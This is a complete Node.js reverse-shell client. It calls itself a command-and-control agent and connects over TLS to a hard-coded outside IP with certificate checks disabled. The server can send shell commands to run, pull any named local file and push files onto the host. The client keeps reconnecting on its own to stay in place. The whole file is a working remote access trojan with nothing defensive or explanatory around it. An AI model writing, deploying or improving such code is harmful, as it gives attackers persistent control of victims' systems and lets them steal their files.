"use strict";
const tls = require('tls')
const fs = require('fs')
const child = require('child_process')
const { exec } = require('child_process');
const { cpuUsage } = require('process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const _options = {
    key: fs.readFileSync('/root/certs/private.key'),
    cert: fs.readFileSync('/root/certs/public.cert'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
const _fsPort = 2223 // File socket port
const _comPort = 2222 // Communication Socket port
const _host = '51.222.157.180' // C&C Server
const _shellType = "sh" //cmd.exe, zsh, sh
// ===========================================================================

// Global variables
let fsClient = {}
let comAlive = false
let connID
// ===========================================================================

/**
 * WriteFile takes destination and creates a new filestream which is written to by the fsClient stream
 * @param {string} destination 
 */
const writeFile = (destination) => {
    if (destination) {
        console.log('destination', destination)
        let destfs = fs.createWriteStream('./' + destination)

        fsClient.pipe(destfs)

        fsClient.on('end', () => {
            console.log('File should be written')
            destfs.close()
        })

        destfs.on('error', (err) => {
            console.log(err)
        })
    }
}

/**
 * sendFile takes localfile and create's a readstream which is piped to fsClient socket stream
 * @param {string} localFile 
 */
const sendFile = (localFile) => {
    console.log(fs.existsSync(localFile))
    try {
        if (fs.existsSync(localFile)) {

            let localfs = fs.createReadStream(localFile)

            localfs.on('open', () => {
                localfs.pipe(fsClient)
            })

            localfs.on('error', (err) => {
                console.log(err)
            })

            localfs.on('end', () => {
                console.log('File fully sent\n')
                fsClient.destroy()
                localfs.close()
            })
        }
    } catch (err) {
        console.log(err)
    }
}

/**
 * Function: Spawns a zsh/cmd/sh child process and streams the stdout back to client socket
 * @param {socket} comClient 
 */
const shellSpawn = (comClient) => {
    const shell = child.spawn(_shellType, []); 

    shell.stdout.on('data', (data) => {
        if (comClient) {
            comClient.write(data)
        }
    });

    shell.stderr.on('data', (data) => {
        if (comClient) {
            comClient.write(data)
        }
    });

    shell.on('close', () => {
        shellSpawn(comClient)
        console.log('Shell Spawned')
    })

    /**
     * Data from server is broken up into few parts:
     * if the first character is 0 : execute as a shell command
     * if the first character is 1 : write to console 
     * if the first character is 2 : reset the shell child process
     * if the first character is 3 : recieve file from server
     * if the first character is 4 : resync the connection ID
     * if the first character is 5 : send file to server
     */
     comClient.on('data', (data) => {
        let msg = data.toString()
        // console.log('msg[0]', msg[0])
        switch (msg.substr(0, 3)) {
            case '_+0':
                shell.stdin.write(msg.substr(3))
                break
            case '_+1':
                console.log('Server: ' + msg.substr(3))
                break
            case '_+2':
                shell.kill()
                break
            case '_+3':
                console.log('Receiving file', msg)
                writeFile(msg.substr(3))
                break
            case '_+4':
                console.log(msg.substr(3))
                connID = msg.substr(3)
                fsClient.write('_+4' + connID)
                break
            case '_+5':
                console.log('Sending file', msg.substr(3))
                sendFile(msg.substr(3))
                break
        }
    })
}

// async await wrapper to make certain functions async
const asyncCall = (callback) => new Promise((resolve) => {
    callback(resolve)
})

/**
 * establishes connection to a file socket server using information below.
 * Connection will be persistant and be reattempted every 1000ms on disconnect
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @param {socket} comClient 
 * @param {function} cb 
 * @returns socket
 */
const fsServerConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
    const client = tls.connect(PORT, HOST, tlsCerts)

    // Connection is established to server
    client.on('secure', () => {
        console.log(`Connected to port ${PORT}`)
        if (cb) {
            cb(client)
        }

        // If the communication socket is alive and connection ID has been assigned, resync it (important for filesockets)
        if(comAlive && connID) {
            console.log(connID)
            client.write('_+4' + connID)
        }
    })

    // if the file socket dropped, attempt to reconnect
    client.on('close', () => {
        console.log(`${PORT} connection closed... reconnecting...`)
        client.destroy()
        if(comAlive == true) {
            setTimeout(() => {
                fsClient = fsServerConnect(PORT, HOST, tlsCerts, cb)
            }, 1000)
        }
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        console.log(error)
        client.destroy()
    })

    return client
}

/**
 * creates a connection to a communication socket server.
 * connection is persistant and will attempt to reconnect every 5s
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @returns socket
 */
const comServerConnect = (PORT, HOST, tlsCerts) => {
    const client = tls.connect(PORT, HOST, tlsCerts)

    // On Successful TLS socket connection, spawn shell
    client.on('secure', async () => {
        comAlive = true
        console.log(`Connected to port ${PORT}`)
        fsClient = await asyncCall((resolve) => {
            return fsServerConnect(_fsPort, _host, _options, client, resolve)
        })
        shellSpawn(client)
    })
    
    // On socket close, attempt to reconnect
    client.on('close', () => {
        comAlive = false
        connID = undefined
        console.log(`${PORT} connection closed... reconnecting...`)
        // fsClient.destroy()
        client.destroy()
        setTimeout(() => {
            comServerConnect(PORT, HOST, tlsCerts)
        }, 5000)
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        comAlive = false
        connID = undefined
        console.log(error)
        // fsClient.destroy()
        client.destroy()
    })

    return client
}

comServerConnect(_comPort, _host, _options)
